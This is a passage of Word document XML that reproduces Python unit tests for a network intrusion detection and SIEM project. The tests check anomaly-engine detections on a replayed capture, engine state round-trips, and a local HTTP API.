    <w:p w14:paraId="1940EE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"192.0.2.20": {"packets": 35, "ports": set()},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0ACAC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"192.0.2.30": {"packets": 25, "ports": set()},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18119D5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6CEE2C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self.assertIsNone(self.sensor._dominant_source(stats, 100))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DFF9DC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20816509" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F0DC45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TestReplayPipeline(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E320EA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"""Generate a scenario capture, replay it, and check the right engines fire."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1169F138" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2857BA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@classmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4890F8F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setUpClass(cls):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CAC4C7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cls.tmp = tempfile.mkdtemp()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FF1DB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cls.path = os.path.join(cls.tmp, "scenario.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E22F7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replay.generate_scenario(cls.path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E8A42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cls.summary = replay.ReplayEngine().run(cls.path, verbose=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292520A8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10629AC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@classmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D9BF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tearDownClass(cls):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09949C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shutil.rmtree(cls.tmp, ignore_errors=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25474550" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A3AD1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test_capture_is_valid_pcap(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D7E218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reader = pcap.PcapReader(self.path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD8AB2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self.assertEqual(reader.linktype, pcap.LINKTYPE_ETHERNET)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152AEE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reader.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AFC594C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DFA7EE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test_all_frames_decode_without_error(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE2D93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self.assertGreater(self.summary["packets"], 1000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B37A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self.assertEqual(self.summary["parser"]["malformed"], 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A772AED" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08B6904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test_every_engine_detects_its_own_attack(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC9DDE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hits = self.summary["engine_hits"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0152557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engine in ("z_score", "knn", "naive_bayes", "bloom", "kmeans"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA55D5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self.assertGreater(hits[engine], 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38FACBC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 produced no detections" % engine)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0867F87F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17B4CEE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test_port_scan_detected_only_during_scan_window(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E71E7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the generated scan runs from t=15s to t=20s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D88D0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scan_times = [a["t"] for a in self.summary["alerts"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A748E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a["engine"] == "knn"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A43C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self.assertTrue(scan_times)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB6B23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t in scan_times:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AE0F8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self.assertGreaterEqual(t, 15.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B76E4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self.assertLess(t, 20.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0E84A3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B0362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test_normal_baseline_produces_no_alerts(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD9D6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baseline_alerts = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F000BB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alert for alert in self.summary["alerts"] if alert["t"] &lt; 15.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCF26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7906E7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self.assertEqual(baseline_alerts, [])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F6C78A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E51B18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test_controlled_interval_attacks_have_source_attribution(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1565C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alert in self.summary["alerts"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62EF8C2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alert["engine"] in ("z_score", "knn", "kmeans"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE0280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self.assertTrue(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246C846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alert["src"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722091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 alert was not attributed" % alert["engine"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66712DAC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EF20F3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test_alerts_carry_attack_technique_and_risk(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="473E111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alert in self.summary["alerts"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33215E1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self.assertTrue(alert["technique_id"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22246D6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self.assertNotEqual(alert["technique_id"], "N/A")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A86E83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self.assertGreater(alert["risk_score"], 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54870B86" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BD1FE73" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="221B7BC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TestBrainRoundTripAcrossEngines(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1367B69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 saved brain must restore every engine's learned state (FR-8)."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD49507" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5265DCA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test_all_five_engines_round_trip(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28CF95F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import engines.bloom as bloom</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB9ED2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import engines.kmeans as kmeans</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DCB5CE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import engines.knn as knn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB93B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import engines.naive_bayes as nb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4627CA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import engines.z_score as zs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8268B8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48F84A0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original = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783D2A6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"z_score": zs.MinimalistStats(window_size=10),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D90001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"knn": knn.KNNMonitor(k=3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786144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"payload": nb.PayloadMonitor(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469F3E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"kmeans": kmeans.KMeansMonitor(k=3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662C8F4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"bloom": bloom.BloomFilter(size=200, hash_count=3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5681A98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750865D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="773F891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give each engine something to learn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7AC8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pps in [10, 12, 11, 13, 9, 10, 12]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1070FA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original["z_score"].analyse(pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="593770D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_ in range(12):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF0C73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original["kmeans"].analyse(11, 2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3616698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original["bloom"].add("192.0.2.66")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14DB723B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41BA03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brain = {k: e.export_brain() for k, e in original.items()}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1825E7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must survive a real JSON serialisation, not just an in-memory dict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011F858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brain = json.loads(json.dumps(brain))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="315123B1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10D30C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restored = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA1CEF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"z_score": zs.MinimalistStats(window_size=10),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598DDD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"knn": knn.KNNMonitor(k=3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326E61B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"payload": nb.PayloadMonitor(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA884B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"kmeans": kmeans.KMeansMonitor(k=3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF796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"bloom": bloom.BloomFilter(size=200, hash_count=3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4B08A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189904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key, engine in restored.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4156532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self.assertTrue(engine.import_brain(brain[key]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C07F8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 failed to import its brain" % key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE9CDD1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A8987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self.assertAlmostEqual(restored["z_score"].w_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5932F68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original["z_score"].w_mean)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1328C8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self.assertEqual(restored["kmeans"].centroids,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EAA459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original["kmeans"].centroids)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053BA10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self.assertTrue(restored["bloom"].check("192.0.2.66"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B9D126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self.assertEqual(set(restored["payload"].likelihoods),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33D7241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set(original["payload"].likelihoods))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8FCB03" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A6C1153" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EE171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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D868D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unittest.main(verbosity=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3BF5D8"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src/tests/test_siem_api.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D536092" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>202 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62AC99A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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12907D7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"""System test for the SIEM HTTP API and JSON telemetry path.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2AA648" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B3A06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The test starts the real UDP listener and HTTP server, sends datagrams through</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C21D17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a socket, and asserts on the responses the browser would receive.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586E64CD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E1DF5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The test binds real ports, so it is skipped automatically if they are already</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E69821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in use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B0A7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0409C503" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05D7B3E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json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1D2DA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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D6E761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socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B4BF7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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2349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threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ADA93F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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6BBD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unittest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6654B5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urllib.request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD6F2AB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03286D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HERE = os.path.dirname(os.path.abspath(__file__))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4105553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SRC = os.path.dirname(HERE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A36CD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SRC not in sys.path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9230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sys.path.insert(0, SRC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F65BACC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CBC1E0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sensor_node.parser as parser_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D86D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utils.logger as logger_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F160E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utils.packet_store as packet_store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1E20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utils.pcap as pcap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC37905" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F065EE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BASE = "http://127.0.0.1:8080"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52748715" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B6F1A6D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5055B3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_port_free(port, kind=socket.SOCK_STREAM):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DC77C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 = socket.socket(socket.AF_INET, kind)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EECEB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420554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s.bind(("127.0.0.1", port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617E88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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3AE72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except OSError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C2EE4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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053CFB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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F7918D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s.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33B9C8A4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="795316B0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="039A59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_get_json(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536265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urllib.request.urlopen(BASE + path, timeout=5) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CD72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json.loads(r.read().decode("utf-8"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649B8F37" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3ED21EAD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DEFB52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@unittest.skipUnless(_port_free(8080) and _port_free(9999, socket.SOCK_DGRAM),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10057F0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"ports 8080/9999 already in use")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE5D0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TestSiemApi(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348481F4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A7A2B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@classmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD39C5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setUpClass(cls):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2022B6E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import dashboard_ui.siem as siem</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECEFC2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cls.siem = siem</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15AC4E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threading.Thread(target=siem.start_siem, daemon=True).start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E43685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time.sleep(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0678B8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5251FDA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populate the in-memory ring buffer with genuinely decoded frames</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E7C4B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parser = parser_mod.PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71658B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cls.frames = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA797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parser_mod.build_tcp(sport=4000 + i, dport=80,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7D760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data=b"GET /index.html HTTP/1.1")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5725FD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i in range(5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677CF29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3F73B26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cls.frames.append(parser_mod.build_udp(sport=5353, dport=53,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="548FAC3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data=b"dns-query"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26CEF7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cls.frames.append(parser_mod.build_icmp(icmp_type=8))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF02558" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53D58B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frame in cls.frames:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425BEBC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pkt = parser.parse(frame)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B70DDC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packet_store.STORE.add({</w:t>
      </w:r>
    </w:p>
